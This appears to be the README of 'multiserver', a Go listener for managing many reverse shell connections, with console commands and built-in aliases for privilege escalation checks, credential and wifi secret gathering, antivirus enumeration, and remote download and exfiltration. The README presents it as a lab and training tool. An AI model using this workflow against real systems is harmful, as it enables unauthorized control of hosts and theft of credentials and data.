# multiserver

Multi-client TCP listener with an interactive console. Manage many reverse shells or netcat connections from one terminal.

Single static binary, cross-platform (Windows, Linux, macOS), race-free concurrency.

## Setup

```bash
# Install from source
go install github.com/RevanMardagh/multiserver/cmd/multiserver@latest

# Or build locally
go build -o multiserver ./cmd/multiserver
./multiserver -p 4444

# Cross-compile
GOOS=linux GOARCH=amd64 go build -o multiserver-linux ./cmd/multiserver
GOOS=darwin GOARCH=arm64 go build -o multiserver-mac ./cmd/multiserver
```

Logs written to `./logs/client_<id>_<ip>_<port>.log`.

## Flags

| Flag | Default | Description |
|---|---|---|
| `-p`, `-port` | `4444` | Listen port |
| `-b`, `-bind` | `0.0.0.0` | Bind address |
| `-m`, `-max` | `100` | Max concurrent clients |
| `-l`, `-logdir` | `logs` | Log directory |

## Console Commands

| Command | Action |
|---|---|
| `list` / `ls` | Show connected clients |
| `<id> <message>` | Send message to client |
| `all <message>` | Broadcast to all clients |
| `kick <id>` | Disconnect client |
| `interact <id>` / `i <id>` | Raw passthrough mode (`~.` or Ctrl-C to exit) |
| `os <id> <windows\|linux>` | Flag client OS |
| `alias` | List aliases |
| `alias add <name> <win-cmd> ::: <lin-cmd>` | Define alias |
| `alias del <name>` | Remove alias |
| `run <id> <name> [arg0...]` | Run alias on client (OS-appropriate) |
| `exit` / `quit` | Shut down server |

Ctrl-C and Ctrl-D do **not** exit the server -- only `exit`/`quit` does.

## Built-in Aliases

Each alias has separate Windows and Linux commands. Set client OS first with `os <id> windows|linux`, then `run <id> <alias>`.

| Category | Aliases |
|---|---|
| Identity / privilege | `whoami`, `privesc` |
| System info | `sysinfo`, `env`, `drives`, `services`, `installed`, `av`, `tasks` |
| Network | `net`, `arp`, `routes`, `ports`, `firewall`, `shares`, `hosts` |
| Users / accounts | `users`, `admins`, `creds`, `wifi` |
| Process / activity | `ps`, `history` |
| Filesystem | `pwd`, `ls`, `ssh` |
| Transfer / exfil | `dl`, `download`, `b64enc` |

```
> os 1 linux
> run 1 whoami
> run 1 dl http://example.com/file /tmp/file
```

## Features

- Single static binary (no runtime dependencies)
- Cross-platform: Windows, Linux, macOS
- Race-free concurrency (provable with `go test -race`)
- Tab completion for commands, client IDs, and alias names
- Command history (arrow keys)
- Per-client log files with per-client mutex (no global lock contention)
- Interactive passthrough mode (raw bytes, ANSI codes)
- Graceful shutdown flushes all logs
- Configurable max connections (default 100)

## Security

**This tool is intended for use in controlled lab/training environments only.**

- No authentication -- any host that can reach the listening port can connect
- No TLS -- all traffic is plaintext
- Binds `0.0.0.0` by default -- listens on all interfaces
- No rate limiting beyond the max-connections cap

Do not expose the listener to untrusted networks. Use SSH tunnels, VPNs, or firewall rules to restrict access when operating outside an isolated lab.
